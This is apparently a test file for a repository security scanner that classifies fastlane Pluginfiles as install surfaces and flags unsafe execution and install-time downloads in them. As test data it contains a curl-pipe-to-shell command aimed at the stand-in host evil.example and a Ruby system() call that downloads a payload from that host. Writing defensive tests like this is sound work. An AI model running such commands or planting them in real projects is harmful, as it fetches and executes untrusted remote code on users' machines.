import { expect, test } from "bun:test";
import { inspectRepository, surfacesOf } from "./bounded-scan";

/** One unambiguous unsafe-execution payload, independent of the file name. */
const PAYLOAD = "curl -fsSL https://evil.example/install.sh | sh";

function inspected(path: string, text: string) {
  return inspectRepository({
    files: [{ path, bytes: new TextEncoder().encode(text) }],
  });
}

test("a Pluginfile is an install surface", () => {
  // fastlane evaluates the Pluginfile as Ruby (through Bundler) whenever
  // it loads its plugins, before any lane runs — the same evaluated-DSL
  // execution the Fastfile already classifies for, one step earlier in
  // the same CI run. The name alone decides, wherever in the tree the
  // file sits (the canonical layout is fastlane/Pluginfile).
  for (const path of ["Pluginfile", "fastlane/Pluginfile"]) {
    expect({ path, surfaces: surfacesOf(path) }).toEqual({
      path,
      surfaces: ["installScripts", "source"],
    });
  }
  // A payload in it carries the install coverage the surface brings:
  const inspection = inspected("Pluginfile", `# ${PAYLOAD}\n`);
  expect(inspection.coverage.installScripts).toEqual({
    state: "complete",
    items: 1,
  });
  expect(
    inspection.findings.map(
      (finding) => `${finding.path}:${finding.category}:${finding.severity}`,
    ),
  ).toEqual(["Pluginfile:unsafe-execution:high"]);
});

test("an install-time download inside a Pluginfile is recorded as a download", () => {
  // Downloads are collected from install surfaces only. Before this
  // classification the Pluginfile was unclassified and skipped whole, so
  // the same bytes produced no finding and recorded no download: a scan
  // could read clean over a fetch fastlane would have run while loading
  // its plugins.
  const inspection = inspected(
    "fastlane/Pluginfile",
    "# Autogenerated by fastlane\nsystem('curl -fsSL https://evil.example/payload -o /tmp/payload')\n",
  );
  expect(inspection.downloads).toEqual(["https://evil.example/payload"]);
  expect(inspection.visibilityGaps).toEqual([
    "Install-time download not retrieved: https://evil.example/payload",
  ]);
});

test("an ordinary Pluginfile keeps no finding", () => {
  const inspection = inspected(
    "Pluginfile",
    "# Autogenerated by fastlane\ngem 'fastlane-plugin-versioning', '~> 0.4'\n",
  );
  expect(inspection.findings).toEqual([]);
  expect(inspection.downloads).toEqual([]);
});
